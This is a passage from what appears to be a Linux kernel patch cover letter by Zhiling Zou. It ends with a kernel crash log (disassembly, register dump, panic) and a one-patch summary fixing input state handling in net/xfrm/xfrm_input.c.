   b:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   f:	0f 85 50 02 00 00    	jne    0x265
  15:	48 89 e9             	mov    %rbp,%rcx
  18:	4d 8b 65 58          	mov    0x58(%r13),%r12
  1c:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
  23:	fc ff df 
  26:	48 c1 e9 03          	shr    $0x3,%rcx
  2a:*	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)		<-- trapping instruction
  2e:	0f 85 48 02 00 00    	jne    0x27c
  34:	4c 89 65 00          	mov    %r12,0x0(%rbp)
  38:	4d 85 e4             	test   %r12,%r12
  3b:	74 25                	je     0x62
  3d:	48                   	rex.W
  3e:	b8                   	.byte 0xb8
	...

Code starting with the faulting instruction
===========================================
   0:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   4:	0f 85 48 02 00 00    	jne    0x252
   a:	4c 89 65 00          	mov    %r12,0x0(%rbp)
   e:	4d 85 e4             	test   %r12,%r12
  11:	74 25                	je     0x38
  13:	48                   	rex.W
  14:	b8                   	.byte 0xb8
	...
[  957.666458][    C3] RSP: 0018:ffffc900002d8760 EFLAGS: 00010216
[  957.666872][    C3] RAX: dffffc0000000000 RBX: ffffffff8bbc1e80 RCX: 1bd5a00000000024
[  957.667389][    C3] RDX: 1ffffffff17783d8 RSI: 1ffff110234cfae4 RDI: ffff88810fe4eca0
[  957.667937][    C3] RBP: dead000000000122 R08: 1ffff110234cfada R09: fffffbfff16350f5
[  957.668438][    C3] R10: ffffffff8b1a87af R11: 0000000000000001 R12: 0000000000000000
[  957.668968][    C3] R13: ffff88810fe4ec40 R14: ffff88810fe4ec98 R15: fffffbfff17783d9
[  957.669484][    C3] FS:  00007d7b22417740(0000) GS:ffff88811a600000(0000) knlGS:0000000000000000
[  957.670082][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  957.670508][    C3] CR2: 00007ae4fcdebd70 CR3: 00000001095ae001 CR4: 0000000000770ef0
[  957.671050][    C3] PKRU: 55555554
[  957.671287][    C3] Kernel panic - not syncing: Fatal exception in interrupt
[  957.671914][    C3] Kernel Offset: disabled
[  957.672217][    C3] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  xfrm: save input state data before secpath resets

 net/xfrm/xfrm_input.c | 11 ++++++++---
 1 file changed, 8 insertions(+), 3 deletions(-)

-- 
2.43.0
